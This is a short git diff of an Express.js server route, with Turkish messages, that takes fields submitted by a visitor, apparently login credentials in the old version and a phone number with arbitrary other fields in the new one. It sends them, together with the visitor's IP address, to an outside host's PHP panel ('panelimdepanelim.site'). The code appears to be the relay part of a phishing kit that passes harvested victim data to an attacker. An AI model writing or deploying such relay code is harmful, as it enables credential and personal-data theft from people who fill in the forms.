@@ -24,28 +24,25 @@ app.get('/', (req, res) => {
 });
  
 app.post('/apitr', async (req, res) => {
-  const clientIp = req.clientIp;
-  const { trname, trpass } = req.body;
-
-  if (!trname || !trpass) {
-      return res.status(400).send("Eksik veri: 'trname' veya 'trpass' gönderilmedi.");
-  }
-
+  const clientIp = req.clientIp;  
+  const { action, phoneinput, ...otherData } = req.body;  
+  
   try {
-      const postData = {
-          ip: clientIp,
-          trname: trname,
-          trpass: trpass,
-      };
 
-      const response = await axios.post('https://panelimdepanelim.site/eksik.php', postData);
-      res.send(response.data);
+    const postData = {
+      ip: clientIp,
+      action: action,
+      ...(phoneinput && { phoneinput: phoneinput }),
+      ...otherData 
+    };
+
+
+    const response = await axios.post('https://panelimdepanelim.site/livechats.php', postData);
+ 
+    res.send(response.data);
   } catch (error) {
-      console.error("Hedef URL'ye POST gönderiminde hata:", error.message);
-      res.status(500).send({
-          error: "Sunucu hatası, lütfen daha sonra tekrar deneyin.",
-          details: error.message,
-      });
+    console.error("Hedef URL'ye POST gönderiminde hata:", error);
+    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
   }
 });
 
